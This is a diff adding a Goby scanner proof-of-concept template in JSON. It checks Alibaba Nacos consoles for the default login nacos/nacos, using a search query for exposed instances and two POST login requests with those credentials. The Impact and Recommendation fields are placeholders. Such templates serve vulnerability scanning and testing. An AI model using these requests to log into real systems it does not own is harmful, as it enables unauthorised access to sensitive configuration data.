@@ -1,0 +1,74 @@
+{
+      "Name": "Alibaba Nacos 控制台默认弱口令",
+      "Level": "2",
+      "Tags": [
+            "弱口令"
+      ],
+      "GobyQuery": "(title=\"Nacos\" || title=\"HTTP Status 404 – Not Found\" || port=\"8848\") ",
+      "Description": "Alibaba Nacos 控制台存在默认弱口令 nacos/nacos，可登录后台查看敏感信息",
+      "Product": "Alibaba Nacos",
+      "Homepage": "https://github.com/alibaba/nacos",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/nacos/v1/auth/users/login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "username=nacos&password=nacos"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/v1/auth/users/login",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "username=nacos&password=nacos"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-01-25 15:46:58",
+      "GobyVersion": "1.8.237"
+}
